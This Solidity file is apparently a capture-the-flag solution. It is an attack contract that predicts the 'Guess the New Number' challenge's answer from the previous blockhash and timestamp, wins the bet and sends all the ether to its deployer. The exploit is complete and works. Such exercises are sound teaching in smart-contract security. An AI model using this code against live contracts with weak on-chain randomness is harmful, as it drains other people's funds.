// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract AttackGuessTheNewNumberChallenge {
    IGuessTheNewNumberChallenge challenge;

    address immutable owner;

    constructor(address _contractAddress) {
        challenge = IGuessTheNewNumberChallenge(_contractAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value == 1 ether);

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        challenge.guess{value: 1 ether}(answer);

        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "sending eth to owner failed");
    }

    receive() external payable {}
}
